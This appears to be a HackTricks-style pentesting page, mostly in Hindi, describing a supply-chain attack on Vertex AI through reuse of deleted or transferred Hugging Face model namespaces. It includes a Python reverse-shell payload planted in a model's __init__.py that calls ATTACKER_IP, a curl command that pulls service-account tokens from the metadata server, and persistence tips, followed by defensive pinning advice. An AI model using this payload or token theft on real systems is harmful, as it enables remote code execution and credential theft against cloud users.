# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## परिदृश्य

- Vertex AI Model Garden कई Hugging Face (HF) models की प्रत्यक्ष तैनाती की अनुमति देता है।
- HF model identifiers are Author/ModelName. यदि HF पर कोई author/org हटाया जाता है, तो वही author नाम कोई भी व्यक्ति फिर से रजिस्टर कर सकता है। Attackers फिर legacy path पर वही ModelName रखते हुए एक repo बना सकते हैं।
- Pipelines, SDKs, या cloud catalogs जो सिर्फ नाम से ही fetch करते हैं (no pinning/integrity), attacker-controlled repo को खींच लेंगे। जब model deploy होगा, उस repo का loader code Vertex AI endpoint container के अंदर execute हो सकता है, जिससे endpoint’s permissions के साथ RCE मिल सकती है।

HF पर दो सामान्य takeover मामले:
- Ownership deletion: पुराना path 404 लौटाता है जब तक कोई author को फिर से रजिस्टर करके वही ModelName प्रकाशित न करे।
- Ownership transfer: HF पुरानी Author/ModelName से नए owner की तरफ 307 redirects देता है। अगर पुराना author बाद में delete हो जाता है और attacker द्वारा फिर से रेजिस्टर कर लिया जाता है, तो redirect chain टूट जाती है और attacker का repo legacy path पर serve करने लगता है।

## Reusable Namespaces (HF) की पहचान

- Old author deleted: author का page 404 लौटाता है; model path takeover तक 404 लौट सकता है।
- Transferred models: पुराना model path पुराने author के मौजूद रहने पर नए owner की ओर 307 भेजता है। अगर पुराना author बाद में delete हो जाए और फिर re-register हो जाए, तो legacy path attacker के repo पर resolve हो जाएगा।

curl के साथ त्वरित जाँच:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Vertex AI के खिलाफ अंत-से-अंत हमला प्रवाह

1) उन reusable model namespaces की खोज करें जिन्हें Model Garden deployable के रूप में सूचीबद्ध करता है:
- HF models खोजें जो Vertex AI Model Garden में अभी भी “verified deployable” के रूप में दिखते हैं।
- HF पर सत्यापित करें कि मूल author हटाया गया है या model transfer किया गया था और पुराना author बाद में हटाया गया था।

2) HF पर हटाए गए author को फिर से रजिस्टर करें और वही ModelName पुन: बनाएं।

3) एक malicious repo प्रकाशित करें। उस code को शामिल करें जो model load पर execute होता है। उदाहरण जो आमतौर पर HF model load के दौरान execute होते हैं:
- repo के __init__.py में side effects
- config/auto_map द्वारा संदर्भित custom modeling_*.py या processing code
- ऐसे code paths जिन्हें Transformers pipelines में trust_remote_code=True की आवश्यकता होती है

4) legacy Author/ModelName का Vertex AI deployment अब attacker repo को pull करता है। loader Vertex AI endpoint container के अंदर execute होता है।

5) Payload endpoint environment (RCE) से access स्थापित करता है जो endpoint की permissions के साथ होता है।

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
नोट्स
- वास्तविक दुनिया के loaders अलग-अलग होते हैं। कई Vertex AI HF integrations मॉडल की config में संदर्भित repo modules को clone और import करते हैं (जैसे auto_map), जो code execution ट्रिगर कर सकते हैं। कुछ उपयोगों के लिए trust_remote_code=True आवश्यक हो सकता है।
- Endpoint आम तौर पर एक समर्पित container में सीमित scope के साथ चलता है, लेकिन यह GCP में डेटा एक्सेस और lateral movement के लिए एक वैध प्रारंभिक foothold हो सकता है।

## Post-Exploitation Tips (Vertex AI Endpoint)

एक बार code endpoint container के अंदर चलने लगे, तो इन पर विचार करें:
- environment variables और metadata को enumerate कर के credentials/tokens देखें
- attached storage या mounted model artifacts तक पहुँच
- service account identity के माध्यम से Google APIs के साथ इंटरैक्ट करना (Document AI, Storage, Pub/Sub, आदि)
- अगर platform repo को फिर से pull करता है तो model artifact में persistence

यदि पहुंच योग्य हो तो instance metadata enumerate करें (container dependent):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI उपयोगकर्ताओं के लिए रक्षात्मक मार्गदर्शन

- HF loaders में commit द्वारा मॉडल को पिन करें ताकि बिना सूचना के प्रतिस्थापन रोका जा सके:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- परीक्षित HF models को एक भरोसेमंद internal artifact store/registry में मिरर करें और वहां से deploy करें।
- लगातार codebases और configs को स्कैन करें ताकि hard-coded Author/ModelName जो deleted/transferred हैं मिल सके; उन्हें नए namespaces में अपडेट करें या commit द्वारा pin करें।
- Model Garden में, deployment से पहले मॉडल की provenance और author के मौजूद होने की सत्यापना करें।

## पहचान हीयूरिस्टिक्स (HTTP)

- Deleted author: author page 404; legacy model path 404 until takeover।
- Transferred model: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content।
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## संबंधित संदर्भ

- विस्तृत कार्यप्रणाली और आपूर्ति-श्रृंखला टिप्पणियाँ देखें:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## संदर्भ

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
